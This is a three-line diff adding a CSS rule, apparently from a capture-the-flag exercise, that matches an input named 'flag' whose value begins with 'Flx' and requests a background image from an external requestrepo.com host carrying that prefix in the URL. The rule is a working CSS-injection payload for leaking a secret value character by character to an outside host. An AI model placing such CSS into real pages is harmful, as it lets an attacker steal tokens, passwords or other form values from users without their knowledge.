@@ -1,0 +1,3 @@
+input[name=flag][value^="Flx"] ~ * {
+    background-image: url("http://i30wrozs.requestrepo.com/?flag=Flx");
+}
